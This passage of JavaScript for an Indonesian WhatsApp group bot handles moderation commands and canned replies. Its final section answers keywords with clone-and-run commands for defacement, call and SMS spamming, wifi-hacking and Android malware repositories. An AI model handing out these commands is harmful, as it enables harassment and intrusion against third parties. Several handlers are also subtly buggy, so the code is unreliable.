            case prefix+'revoke': case prefix+'resetlink':
           if (!isGroup) return reply(mess.OnlyGrup)
           if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
           if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                xinz.revokeInvite(from)
               .then((res) => reply('Link group berhasil direset!'))
              break
            case prefix+'delete':
			case prefix+'del':
			case prefix+'d':
				if (!isGroup)return reply(mess.OnlyGrup)
				if (!isGroupAdmins && !isOwner)return reply(mess.GrupAdmin)
                if (!isQuotedMsg) return reply(`Reply pesan dari bot`)
                if (!quotedMsg.fromMe) return reply(`Reply pesan dari bot`)
				xinz.deleteMessage(from, { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
				break
            case prefix+'afk':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (isAfkOn) return reply('afk sudah diaktifkan sebelumnya')
                if (body.slice(150)) return reply('Alasanlu kepanjangan')
                let reason = body.slice(5) ? body.slice(5) : 'Nothing.'
                afk.addAfkUser(sender, Date.now(), reason, _afk)
                mentions(`@${sender.split('@')[0]} sedang afk\nAlasan : ${reason}`, [sender], true)
                break
            case prefix+'infogrup':
            case prefix+'infogrouup':
            case prefix+'grupinfo':
            case prefix+'groupinfo':
                if (!isGroup) return reply(mess.OnlyGrup)
                try {
                    var pic = await xinz.getProfilePicture(from)
                } catch {
                    var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
                }
                let ingfo = `*G R O U P I N F O*\n\n*Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length}\n*Welcome :* ${isWelcome ? 'Aktif' : 'Mati'}\n*Left :* ${isLeft ? 'Aktif' : 'Mati'}\n*AntiLink :* ${isAntiLink ? 'Aktif' : 'Mati'}\n*AntiBadword :* ${isBadword ? 'Aktif' : 'Mati'}\n*Desc :* \n${groupMetadata.desc}`
                xinz.sendMessage(from, await getBuffer(pic), image, {quoted: msg, caption: ingfo, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})
                break
            case prefix+'add':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner)return reply(mess.GrupAdmin)
                if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				if (isQuotedMsg && args.length < 2) {
                    xinz.groupAdd(from, [quotedMsg.sender])
                    reply(`Sukses menambah member baru`)
                } else if (args.length < 3 && !isNaN(args[1])){
					xinz.groupAdd(from, [args[1] + '@s.whatsapp.net'])
					reply(`Wahhh makanan kita udh datang`)
				} else {
					reply(`kirim perintah ${prefix}add @tag atau reply pesan orang yang ingin di kick`)
				}
                break
            case prefix+'kick':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner)return reply(mess.GrupAdmin)
                if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                if (mentioned.length !== 0){
                    xinz.groupRemove(from, mentioned)
                    reply(`Mampus di kick lu`)
                } else if (isQuotedMsg) {
                    if (quotedMsg.sender === ownerNumber) return reply(`Tidak bisa kick Owner`)
                    xinz.groupRemove(from, [quotedMsg.sender])
                    reply(`Kasian di kick🤣 , jangan bawa makanan ya kak`)
                } else if (!isNaN(args[1])) {
                    xinz.groupRemove(from, [args[1] + '@s.whatsapp.net'])
                    reply(`Selamat tinggal.... Semoga kmu Hidup di alam sana ya`)
                } else {
                    reply(`Kirim perintah ${prefix}kick @tag atau nomor atau reply pesan orang yang ingin di kick`)
                }
                break
            case prefix+'kicktime':
                if (!isGroup) return reply(`Perintah Ini Hanya Untuk Di Dalam Group`)
                if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
                if (!isGroupAdmins) return reply(`Jadiin Bot Sebagai Admin Biar Bot Kick Member`)
                if (mentioned.length !== 0){
                setTimeout(() => {
                }, 1000) // 1000 = 1s,
                  xinz.sendMessage(from, `Bismillah Kick`, text)
                setTimeout(() => {
                }, 20000) // 1000 = 1s,
                  xinz.sendMessage(from, `Babay sayang`, text)
                setTimeout(() => {
                }, 30000) // 1000 = 1s,
                  xinz.sendMessage(from, `Yeee Anda dikick`, text)
                  xinz.groupRemove(from, mentioned)
             } else {
                  reply(`Kirim perintah ${prefix}kicktime @tag yg ingin di kick`)
                }
                break
            case prefix+'promote':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner)return reply(mess.GrupAdmin)
                if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                if (mentioned.length !== 0){
                    xinz.groupMakeAdmin(from, mentioned)
                    reply(`Anda sekarang udh jadi admin Keren kak`)
                } else if (isQuotedMsg) {
                    xinz.groupMakeAdmin(from, [quotedMsg.sender])
                    reply(`Selamat ya kak anda jadi admin baru`)
                } else if (!isNaN(args[1])) {
                    xinz.groupMakeAdmin(from, [args[1] + '@s.whatsapp.net'])
                    reply(`Sukses menambah admin group ini`)
                } else {
                    reply(`Kirim perintah ${prefix}promote @tag atau nomor atau reply pesan orang yang ingin di promote`)
                }
                break
            case prefix+'demote':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner)return reply(mess.GrupAdmin)
                if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                if (mentioned.length !== 0){
                    xinz.groupDemoteAdmin(from, mentioned)
                    reply(`Yahh di turunkan jadi member dong:(`)
                } else if (isQuotedMsg) {
                    if (quotedMsg.sender === ownerNumber) return reply(`Tidak bisa kick Owner`)
                    xinz.groupDemoteAdmin(from, [quotedMsg.sender])
                    reply(`maaf ya kak anda di turunkan jadi member lagi`)
                } else if (!isNaN(args[1])) {
                    xinz.groupDemoteAdmin(from, [args[1] + '@s.whatsapp.net'])
                    reply(`sukses demote admin group`)
                } else {
                    reply(`Kirim perintah ${prefix}demote @tag atau nomor atau reply pesan orang yang ingin di demote`)
                }
                break
            case prefix+'linkgc': case prefix+'linkgrup': case prefix+'linkgroup':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                xinz.groupInviteCode(from)
                .then((res) => reply('https://chat.whatsapp.com/' + res))
                break
            case prefix+'leave':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner)return reply(mess.GrupAdmin)
                reply('Byee.... Syaa mau Keluar Yah')
                .then(() => xinz.groupLeave(from))
                break
            case prefix+'setdesc':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner)return reply(mess.GrupAdmin)
                if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                if (args.length === 1) return reply(`Penggunaan ${prefix}setdesc desc`)
                xinz.groupUpdateDescription(from, q)
                reply(`Sukses Mengubah Setdesc DiGroup Ini`)
                break
            case prefix+'setgrupname':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner)return reply(mess.GrupAdmin)
                if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                if (args.length === 1) return reply(`Penggunaan ${prefix}setgrupname name`)
                xinz.groupUpdateSubject(from, q)
                reply(`Sukses Mengubah Setgrupname DiGroup Ini`)
                break
            case prefix+'sider': case prefix+'chatinfo':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isQuotedMsg) return reply(`Reply pesan dari bot`)
                if (!quotedMsg.fromMe) return reply(`Reply pesan dari bot`)
                    xinz.messageInfo(from, msg.message.extendedTextMessage.contextInfo.stanzaId)
                    .then((res) => {
                        let anu = []
                        let txt = `*Info Chat*\n\n`
                        for (let i = 0; i < res.reads.length; i++){
                            anu.push(res.reads[i].jid)
                            txt += `@${res.reads[i].jid.split("@")[0]}\n`
                            txt += `Waktu membaca : ${moment(`${res.reads[i].t}` * 1000).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                        }
                        mentions(txt, anu, true)
                    })
                    .catch((err) => reply(jsonformat(err)))
                break
            case prefix+'opengrup':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner)return reply(mess.GrupAdmin)
                if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                xinz.groupSettingChange(from, "announcement", false)
                reply(`Sukses Mengubah Grup Menjadi Agar Semua Mengirim pesan Di group ini`)
                break
            case prefix+'closegrup':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner)return reply(mess.GrupAdmin)
                if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                xinz.groupSettingChange(from, "announcement", true)
                reply(`Sukses Mengubah Grup Menjadi Agar Hanya Dapat Admin yang mengirim pesan Di Group ini`)
                break
            case prefix+'setppgrup':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner)return reply(mess.GrupAdmin)
                if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                if (isImage || isQuotedImage) {
                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
                    let media = await xinz.downloadMediaMessage(encmedia)
                    xinz.updateProfilePicture(from, media)
                    reply(`Sukses`)
                } else {
                    reply(`Kirim atau tag gambar dengan caption ${prefix}setppgrup`)
                }
                break
            case prefix+'join':
                if (!isOwner) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Kirim perintah *${prefix}join* link grup`)
                if (!isUrl(args[1]) && !args[1].includes('chat.whatsapp.com')) return reply(mess.error.Iv)
                let code = args[1].replace('https://chat.whatsapp.com/', '')
                xinz.acceptInvite(code)
                reply(`Berhasil Join`)
                break
            case prefix+'tagall':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner)return reply(mess.GrupAdmin)
                let arr = [];
                let txti = `*[ TAG ALL ]*\n\n${q ? q : ''}\n\n`
                for (let i of groupMembers){
                    txti += `=> @${i.jid.split("@")[0]}\n`
                    arr.push(i.jid)
                }
                mentions(txti, arr, true)
                break
//------------------< Enable / Disable >-------------------
            case prefix+'antibadword':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
                if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                if (args.length === 1) return reply(`Pilih enable atau disable`)
                if (args[1].toLowerCase() === 'enable'){
                    if (isBadword) return reply(`Udah aktif`)
                    grupbadword.push(from)
					fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
					reply(`antibadword grup aktif, kirim ${prefix}listbadword untuk melihat list badword`)
                } else if (args[1].toLowerCase() === 'disable'){
                let anu = grupbadword.indexOf(from)
                    grupbadword.splice(groupId, 1)
                    fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
                    reply('antibadword grup nonaktif')
                } else {
                    reply(`Pilih enable atau disable`)
                }
                break 
            case prefix+'listbadword':
                let bi = `List badword\n\n`
                for (let boo of badword){
                    bi += `- ${boo}\n`
                }
                bi += `\nTotal : ${badword.length}`
                reply(bi)
                break
            case prefix+'addbadword':
                if (!isOwner) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`masukkan kata`)
                if (isKasar(args[1].toLowerCase(), badword)) return reply(`Udah ada`)
                addBadword(args[1].toLowerCase(), badword)
                reply(`Sukses`)
                break
            case prefix+'delbadword':
                if (!isOwner) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`masukkan kata`)
                if (!isKasar(args[1].toLowerCase(), badword)) return reply(`Ga ada`)
                delBadword(args[1].toLowerCase(), badword)
                reply(`Sukses`)
                break
            case prefix+'clearbadword':
                if (!isOwner) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`tag atau nomor`)
                if (mentioned.length !== 0){
                    for (let i = 0; i < mentioned.length; i++){
                    delCountKasar(mentioned[i], senbadword)
                    }
                    reply('Sukses')
                } else {
                    delCountKasar(args[1] + '@s.whatsapp.net', senbadword)
                    reply('Sukses')
                }
                break
            case prefix+'mute':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
                if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                if (isMuted) return reply(`udah mute`)
                mute.push(from)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                reply(`Bot berhasil dimute di chat ini`)
                break 
            case prefix+'antilinkig':
                  if (!isGroup) return reply(mess.OnlyGrup)
                  if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
                  if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                  if (args.length === 1) return reply(`Pilih enable atau disable`)
                if (args[1].toLowerCase() === 'enable'){
                	if (isAntilinkIg) return reply(`udah aktif`)
                    antilinkig.push(from)
                 fs.writeFileSync('./database/antilinkig.json', JSON.stringify(antilinkig))
                      reply('[SUKSES] mengaktifkan fitur antilink ig')
              } else if (args[1].toLowerCase() === 'disable'){
                    let anu = antilinkig.indexOf(from)
                    antilinkig.splice(groupId, 1)
                    fs.writeFileSync('./database/antilinkig.json', JSON.stringify(antilinkig))
                    reply('[SUKSES] menonaktifkan fitur antilink ig')
                 } else {
                    reply(`pilih enable atau disable`)
                 }
                    break
            case prefix+'antilinkyt':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmins)
                if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                if (args[1].toLowerCase() === 'enable'){
                   if (isAntilinkyt) return reply(`udah aktif kak`)
                   antilinkyt.push(from)
                   fs.writeFileSync('./database/antilinkyt.json', JSON.stringify(antilinkyt))
                   reply('「 ANTILINK YT 」Telah aktif')
              } else if (args[1].toLowerCase() === 'disable'){
                   let anu = antilinkyt.indexOf(from)
                   fs.writeFileSync('./database/antilinkyt.json', JSON.stringify(antilinkyt))
                   reply('「 ANTILINK YT 」Telah dinonaktifkan')
               } else {
                  reply(`pilih enable atau disable`)
                 }
                 break
            case prefix+'antilink':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
                if (!isBotGroupAdmins) return reply(`Jadiin Bot Sebagai Admin Biar Bot Kick Member`)
                if (args.length === 1) return reply(`Pilih enable atau disable`)
                if (args[1].toLowerCase() === 'enable'){
                    if (isAntiLink) return reply(`Udah aktif`)
                    antilink.push(from)
					fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
					reply('Antilink grup aktif')
                } else if (args[1].toLowerCase() === 'disable'){
                    let anu = antilink.indexOf(from)
                    antilink.splice(groupId, 1)
                    fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
                    reply('Antilink grup nonaktif')
                } else {
                    reply(`Pilih enable atau disable`)
                }
                break 
              case prefix+'antiwame':
                   if (!isGroup) return reply(mess.OnlyGrup)
                   if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
                   if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                   if (args.length === 1) return reply(`pilih enable atau disable\n\nContoh: ${prefix}antiwame enable`)
                   if (args[1].toLowerCase() === 'enable'){
                   	if (isAntiWame) return reply(`udah aktif dari tadi`)
                       antiwame.push(from)
                       fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame))
                       reply(`「 ANTI WAME 」\n\nTelah Aktif Di Dalam Group ini`)
                   } else if (args[1].toLowerCase() === 'disable'){
                   	let anu = antiwame.indexOf(from)
                       antiwame.splice(groupId, 1)
                       fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame))
                       reply(`「 ANTI WAME 」\n\nTelah Nonaktifkan Di Dalam Group Ini`)
                  } else {
                  	reply(`Pilih enable atau disable`)
                  }
                  break
            case prefix+'autosticker':
            case prefix+'autostik':
            case prefix+'autstik':
                
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
                if (args.length === 1) return reply(`Pilih enable atau disable`)
                if (args[1].toLowerCase() === 'enable') {
                    if (isAutoStickerOn) return reply(`Udah aktif`)
                    autosticker.push(from)
                    fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
                    reply(`Auto Sticker Aktif`)
                } else if (args[1].toLowerCase() === 'disable') {
                    autosticker.splice(groupId, 1)
                    fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
                    reply(`Auto Sticker Nonaktif`)
                } else {
                    reply(`Pilih enable atau disable`)
                }
                break
            case prefix+'welcome':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
                if (args.length === 1) return reply(`Pilih enable atau disable`)
                if (args[1].toLowerCase() === 'enable'){
                    if (isWelcome) return reply(`Udah aktif`)
                    welcome.push(from)
					fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome))
					reply('Welcome aktif')
                } else if (args[1].toLowerCase() === 'disable'){
                    let anu = welcome.indexOf(from)
                    welcome.splice(anu, 1)
                    fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome))
                    reply('Welcome nonaktif')
                } else {
                    reply(`Pilih enable atau disable`)
                }
                break
            case prefix+'left':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
                if (args.length === 1) return reply(`Pilih enable atau disable`)
                if (args[1].toLowerCase() === 'enable'){
                    if (isLeft) return reply(`Udah aktif`)
                    left.push(from)
					fs.writeFileSync('./database/left.json', JSON.stringify(left))
					reply('Left aktif')
                } else if (args[1].toLowerCase() === 'disable'){
                    let anu = left.indexOf(from)
                    left.splice(anu, 1)
                    fs.writeFileSync('./database/left.json', JSON.stringify(left))
                    reply('Left nonaktif')
                } else {
                    reply(`Pilih enable atau disable`)
                }
                break 
              case prefix+'intro':
                      if (!isGroup) return reply(mess.OnlyGrup)
                  textImg(`╭════•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ *INTRO*  ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙═════ 
|             *KARTU MEMBER*
|  
|  
| Nama        :
| Kelas       :
| Umur        :
| Agama       :
| Status      :
| Askot       :
| Kelamin     :
 ╰═════ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙═════╯
                          
 Isi-!!`)
                   break
//------------------< SIMI - SIMI >--------------------
             case 'halo simi':{
             	textImg(`halo juga`)
             }
                 break 
             case 'simi kamu lagi apa?':{
             	textImg(`lagi mikirin kamu hehehe`)
             }
                  break
             case 'apakabar simi':{
             	textImg(`aku baik baik saja, kalau kamu?`)
             }
                  break
             case 'baik juga':{
             	textImg(`ohhhh`)
             }
                  break 
              case 'kapan kmu ultah?':{
              	textImg(`tunggu kamu ultah juga hehehe`)
              }
                  break 
              case 'simi kamu sayang gak sama aku':{
              	textImg(`sayang kok, kalau kamu sayang ga sma aku?`)
               }
                   break 
              case 'simi kamu sayang ga sama aku?':{
              	textImg(`sayang kok, kalau kamu sayang gak sama aku?`)
              }
                    break 
               case 'simi umur kamu brp?':{
               	textImg(`umur aku 11 tahun kak`)
               }
                   break 
               case 'simi lu tau ga':{
               	textImg(`tau apaan tod?`)
               }
                    break
//-------------------> AUto Reponder <-----------------
             case 'waalaikumsalam':{
             	textImg(`Terima Kasih Telah Menjawab☺️`)
             }
                  break 
             case 'kick':{
             	textImg(`Ngapain Kak Ngekick?`)
             }
                 break 
             case ':v':{
                textImg(`artinya itu tuh apa ya kak? tolong jelasin dong`)
            }
                break
             case 'deface':{
             	textImg(`Perusakan situs web atau deface situs web adalah serangan terhadap situs web yang mengubah tampilan visual situs web atau halaman web. Ini biasanya merupakan pekerjaan defacer, yang membobol peladen web dan mengganti situs web yang di-hosting dengan situs web mereka sendiri`)
             }
                  break 
             case 'termux':{
             	textImg(`Termux adalah emulator terminal Android dan aplikasi lingkungan Linux yang bekerja langsung tanpa rooting atau pengaturan tertentu. Termux yang juga termasuk lingkungan Linux berbasis Debian yang bisa mendukung perangkat berarsitektur 32-bit dan 64-bit dengan dijalankan pada OS Android versi 5.0 ke atas`)
             }
                  break 
             case 'hallo': case 'halo':{
                 textImg(`Hallo Juga Kak`)
            }
                 break
             case 'hai': case 'Hai':{
                 textImg(`Hai Juga`)
            }
                  break
             case 'malam':{
                 textImg(`Too`)
            }
                  break
             case 'gabut': case 'Gabut':{
                 textImg(`Aku Juga Gabut Main Sama Bot Aja Yuk`)
            }
                  break
             case 'pagi': case 'pgi':{
                 textImg(`Too`)
            }
                 break
             case 'Bot': case 'bot':{
                  textImg(`Apaan Manggil Manggil Bot? Kangen Sama Bot Yaaa😂 Canda`)
            }
                 break
             case 'Intro': case 'intro':{
                textImg(`ketik aja #intro kak biar lengkap intro nya hehehe`)
             }
                   break 
 // ---------------> Fitur Auto Responder Script <---------------
                  case 'scriptdeface':{
                  	if (!isGroup) return reply(mess.OnlyPM)
                  	textImg(`pkg install git\n\npkg install python2\n\ngit clone https://github.com/4L13199/LITESCRIPT\n\ncd LITESCRIPT\n\npython2 LITESCRIPT.py`)
                  }
                  break 
                  case 'spamcall':{
                  	if (!isGroup) return reply(mess.OnlyPM)
                  	textImg(`git clone https://github.com/termuxandi/spamtelphone\n\ncd spamtelphone\n\npython Blackphone\nJangan di salah gunakan ilmu ini`)
                  }
                  break 
                  case 'spamsms':{
                  	if (!isGroup) return reply(mess.OnlyPM)
                  	textImg(`git clone https://github.com/IL4NGQW3R/brutalspammer\n\ncd brutalspammer\n\npython BrutalSpammers.py\njangan di salah gunakan ilmu ini`)
                  }
                  break 
                  case 'installtermuxubuntu': case 'install termux ubuntu':{
                  	if (!isGroup) return reply(mess.OnlyPM)
                  	textImg(`git clone https://github.com/Neo-Oli/termux-ubuntu\n\ncd termux-ubuntu\n\nsh ubuntu.sh`)
                  }
                  break 
                  case 'scripterkey':{
                  	if (!isGroup) return reply(mess.OnlyPM)
                  	textImg(`git clone https://github.com/karjok/terkey\n\ncd terkey\n\npython terkey.py`)
                  }
                  break 
                  case 'scriptspammers':{
                  	if (!isGroup) return reply(mess.OnlyPM)
                     textImg(`git clone https://github.com/Rhmn9/SpammersNoRoot\n\ncd SpammersNoRoot\n\nsh Spammers.sh`)
                   }
                     break
                    case 'scriptwifihacker':{
                    	if (!isGroup) return reply(mess.OnlyPM)
                 	  textImg(`git clone https://github.com/esc0rtd3w/wifi-hacker\n\ncd wifi-hacker\n\nchmod +x wifi-hacker.sh\n\n./wifi-hacker.sh\n\njangan asal di salah gunakan`)
                    }
                    break 
                    case 'scriptsqlmap':{
                    	if (!isGroup) return reply(mess.OnlyPM)
                 	textImg(``)
                   }
                   break 
                   case 'scriptandroidmalware':{
                   	if (!isGroup) return reply(mess.OnlyPM)
                   	textImg(`git clone https://github.com/ashishb/android-malware\n\ncd android-malware\n\nls\n\nJangan Di salah gunakan ilmu ini`)
                   }
                  break 
                  case 'scriptminitools':{
                  	if (!isGroup) return reply(mess.OnlyPM)
                  	textImg(`git clone https://github.com/rootM3eX/MiniTools\n\ncd MiniTools\n\nsh aaa.sh`)
                  }
                  break 
                  case 'scriptvtools':{
                  	if (!isGroup) return reply(mess.OnlyPM)
                  	textImg(`git clone https://github.com/rootM3eX/VTools\n\ncd VTools\n\nls`)
                  }
                  break 
                  case 'githubme':{
                  	textImg(`pip install lolcat\n\npkg install figlet\n\ngit clone https://github.com/Rhmn9/spammers\n\ncd spammers\n\nsh spammers.sh\n\nKalau Error Bisa liat di githubnya`)
                  }
                  break
//-------------------> Command Termux <---------------
             
        }
    } catch (err) {
        console.log(color('[ERROR]', 'red'), err)
    }
}
